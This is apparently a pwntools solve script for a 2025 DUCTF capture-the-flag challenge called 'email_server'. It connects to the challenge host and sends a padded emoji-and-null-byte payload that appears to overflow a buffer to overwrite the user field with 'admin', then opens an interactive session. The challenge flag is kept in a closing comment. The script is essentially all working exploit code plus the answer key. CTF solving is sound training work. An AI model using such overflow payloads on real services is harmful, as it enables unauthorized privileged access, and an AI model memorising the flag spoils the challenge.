from pwn import *


elf = context.binary = ELF("email_server")
# p = process()
p = remote("chal.2025.ductf.net", 30000)


# gdb.attach(p,"b *main+366")
p.sendlineafter(":","guest")
p.sendlineafter(":","🇦🇩🇲🇮🇳".encode().ljust(32,b"\x00") + b"admin\x00".ljust(32,b"A")  )

p.interactive()

# DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}